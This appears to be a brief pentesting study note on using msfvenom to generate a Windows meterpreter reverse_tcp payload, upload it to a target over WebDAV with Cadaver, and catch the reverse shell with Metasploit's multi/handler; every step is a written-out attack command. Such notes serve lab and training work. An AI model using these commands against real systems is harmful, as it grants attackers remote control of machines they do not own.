# MSF Venom
* It is a Metasploit tool that generates a payload to get reverse shell access or remote access to a target system.
* `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[My IP not the target IP] LPORT=[Any port that could be free] -f [file type found suitable for the payload] > [write it down file name].[suitable extension]`
* Then move to Cadaver and "put" this shell file into the remote system.
* Before executing this payload by clciking on it, we need to add a listener/handler which will receive the reverse connection from the actual target system, and start a meterpreter session upon execution.
* To do this:
    * Start the DB as Metasploit framework requires Metasploit database to be started.
    * `service postgresql start && msfconsole`
    * `use multi/handler` --> `set payload windows/meterpreter/reverse_tcp` --> `set LHOST=[My IP] and LPORT` --> `exploit` --> This will launch a meterpreter session
